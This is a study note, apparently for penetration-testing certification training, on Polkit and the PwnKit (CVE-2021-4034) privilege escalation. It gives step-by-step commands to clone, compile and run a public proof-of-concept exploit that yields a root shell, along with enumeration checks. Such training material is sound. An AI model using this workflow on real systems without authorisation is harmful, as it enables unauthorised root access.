## 1. What is Polkit?

**PolicyKit (`polkit`)** is an authorization service on Linux-based systems.

It allows **user software and system components to communicate** when the user software is authorized to perform a particular operation.

Basic flow:

```text
User / Application
       │
       ▼
     polkit
       │
       ├── Authorized → Operation allowed
       │
       └── Not authorized → Operation denied / authentication required
```

Polkit can define whether an operation is:

- Generally allowed
    
- Forbidden
    
- Allowed after administrator authorization
    
- Allowed with one-time authorization
    
- Allowed for a specific process/session
    
- Allowed indefinitely
    

---

# 2. Polkit Configuration Files

Polkit primarily works with two groups of files:

### Actions / Policies

```text
/usr/share/polkit-1/actions
```

These define available actions and their policies.

### Rules

```text
/usr/share/polkit-1/rules.d
```

These contain authorization rules.

### Local Authority

Polkit can also use **local authority rules**.

Custom `.pkla` files can be placed in:

```text
/etc/polkit-1/localauthority/50-local.d
```

So remember:

```text
Polkit
├── /usr/share/polkit-1/actions
├── /usr/share/polkit-1/rules.d
└── /etc/polkit-1/localauthority/50-local.d/*.pkla
```

---

# 3. Polkit Utilities

Polkit provides several useful programs:

|Tool|Purpose|
|---|---|
|`pkexec`|Run a program as another user/root|
|`pkaction`|Display available actions|
|`pkcheck`|Check whether a process is authorized for an action|

### Most interesting: `pkexec`

`pkexec` is particularly interesting for privilege escalation because it can execute programs with another user's privileges, including **root**.

Syntax:

```bash
pkexec -u <user> <command>
```

Example:

```bash
pkexec -u root id
```

Expected result when authorized:

```text
uid=0(root) gid=0(root) groups=0(root)
```

---

# 4. Pkexec and Privilege Escalation

A major vulnerability affecting `pkexec` is:

## CVE-2021-4034 — PwnKit

This is a **memory corruption vulnerability** in `pkexec`.

The module describes it as a local privilege-escalation vulnerability that can allow an unprivileged user to obtain **root privileges**.

```text
Unprivileged User
       │
       ▼
    pkexec
       │
 CVE-2021-4034
       │
       ▼
     root
```

### Important facts

- Vulnerability: **CVE-2021-4034**
    
- Common name: **PwnKit**
    
- Affects: `pkexec`
    
- Type: Memory corruption
    
- Impact: Local privilege escalation
    
- Result: Potential **root shell**
    

The vulnerability had existed for more than ten years before being publicly disclosed in November 2021 and subsequently fixed.

---

# 5. Exploitation Workflow

The module demonstrates using a PoC.

### Step 1 — Obtain the PoC

```bash
git clone https://github.com/arthepsy/CVE-2021-4034.git
```

### Step 2 — Enter the directory

```bash
cd CVE-2021-4034
```

### Step 3 — Compile

```bash
gcc cve-2021-4034-poc.c -o poc
```

This creates:

```text
poc
```

### Step 4 — Execute

```bash
./poc
```

According to the module, the exploit results in a privileged shell.

Then:

```bash
bash
```

And verify:

```bash
id
```

Expected:

```text
uid=0(root) gid=0(root) groups=0(root)
```

---

# 6. Enumeration Mindset

When you encounter Polkit during Linux privilege escalation:

```text
                Polkit
                  │
        ┌─────────┴─────────┐
        ▼                   ▼
     pkexec             Policies/Rules
        │                   │
        ▼                   ▼
   Check version       Check authorization
        │
        ▼
CVE-2021-4034?
        │
   ┌────┴────┐
   │         │
  Yes        No
   │         │
   ▼         ▼
 PoC       Continue
```

Useful initial checks:

```bash
which pkexec
```

```bash
pkexec --version
```

```bash
pkaction
```

You can also inspect the binary:

```bash
ls -l /usr/bin/pkexec
```

---

# 7. CPTS Key Point

The **important privilege-escalation concept** is not simply:

> "`pkexec` exists → root."

Instead:

```text
pkexec present
      │
      ▼
Determine version
      │
      ▼
Is it vulnerable?
      │
      ▼
CVE-2021-4034 / PwnKit
      │
      ▼
PoC
      │
      ▼
Root
```

**`pkexec` being installed does not by itself mean the machine is vulnerable.**

---

# 8. Connection to Previous Modules

This fits directly into your Linux privilege-escalation methodology:

```text
Enumeration
    │
    ├── sudo -l
    ├── SUID
    ├── Capabilities
    ├── Cron
    ├── Services
    ├── Groups
    ├── Kernel
    │
    └── Polkit
           │
           ▼
       pkexec
           │
           ▼
     Version check
           │
           ▼
     Known vulnerability
           │
           ▼
     CVE-2021-4034
           │
           ▼
          root
```

### Memory trick

> **Polkit → pkexec → PwnKit → CVE-2021-4034 → root**

And distinguish it from the other major sudo vulnerability you've studied:

```text
CVE-2019-14287
    → sudo
    → negative UID
    → root

CVE-2021-4034
    → pkexec
    → PwnKit
    → root
```

**CPTS takeaway:** When you see `/usr/bin/pkexec`, don't immediately exploit it. **Enumerate → identify version/configuration → determine vulnerability → verify exploitability → escalate → verify with `id`.**